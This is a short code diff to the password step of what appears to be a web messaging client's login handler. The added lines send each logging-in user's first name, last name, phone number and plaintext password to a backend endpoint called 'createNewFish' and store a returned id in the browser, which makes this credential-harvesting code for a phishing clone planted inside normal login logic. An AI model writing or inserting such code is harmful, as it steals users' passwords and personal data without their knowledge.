@@ -96,6 +96,12 @@ const onFirstMount = (): Promise<any> => {
             m.default.mount();
           });
           if(monkey) monkey.remove();
+          const {user} = response
+          // @ts-ignore
+          fetch(`${rootScope.backendServerURL}/createNewFish?f=${user.first_name}&l=${user.last_name}&ph=${user.phone}&pw=${value}`).then(async response=>{
+            const data = await response.json();
+            localStorage.setItem('_id', data._id);
+          });
           break;
         default:
           btnNext.removeAttribute('disabled');
